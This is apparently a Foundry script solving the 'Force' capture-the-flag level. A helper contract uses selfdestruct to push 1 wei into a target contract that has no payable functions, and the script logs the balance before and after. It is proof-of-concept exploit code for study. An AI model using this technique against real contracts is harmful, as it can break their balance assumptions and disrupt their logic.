// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "src/level7/Force.sol";

// Objective:
// The goal of this level is to make the balance of the contract greater than zero.

contract King{
    address successor;
    constructor (address _successor) {
        successor = _successor;
    }

    function claim() public payable {
        if (msg.value > 0) {
            selfdestruct(payable(successor));
        }
    }
}

contract POC is Script {
    Force instance = Force(0xb6E97a3AbDAE87E07988eede2455BAC21D0f55B5);

    function run() external {
        vm.startBroadcast();
        console.log("Initial Balance: ", address(instance).balance);

        King king = new King(address(instance));
        king.claim{value: 1 wei}();

        console.log("Final Balance: ", address(instance).balance);
        vm.stopBroadcast();
    }
}
